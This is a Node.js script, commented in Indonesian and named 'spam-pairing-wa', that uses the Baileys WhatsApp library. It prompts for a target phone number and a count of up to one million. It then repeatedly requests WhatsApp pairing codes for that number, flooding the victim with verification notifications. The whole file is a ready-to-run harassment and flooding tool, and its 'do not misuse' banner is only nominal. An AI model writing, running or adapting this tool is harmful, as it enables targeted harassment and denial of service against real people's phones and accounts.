const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, (answer) => { rl.close(); resolve(answer); }); });
};

async function socket() {
    const { state } = await useMultiFileAuthState('./69/session');
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        const phoneNumber = await question(color + 'Target : ' + xColor);
        
        // Meminta jumlah spam, batas dinaikkan ke 1 juta
        const whiskey = parseInt(await question(color + 'Total spam (1-1000000): ' + xColor));

        if (isNaN(whiskey) || whiskey <= 0 || whiskey > 1000000) {
            console.log('Masukkan angka antara 1-1000000.');
            return;
        }

        for (let i = 0; i < whiskey; i++) {
            try {
                let code = await sock.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(color + `Sukses Spam Pairing Code - Nomor: ${phoneNumber} dari: [${i + 1}/${whiskey}]` + xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }

    return sock;
}

console.log(color + `Running... spam-pairing-wa
=========================
 • spam-pairing-wa
 • do not misuse 
=========================
┏❐ 
┃ [ IKUTI INSTRUKSI DI BAWAH UNTUK SPAM ]
┃
┃⭔ Target Number ( 62xxxxxxx )
┃⭔ Jumlah spam ( 1-1000000 )
┃
┗❐ 
=========================` + xColor);

socket();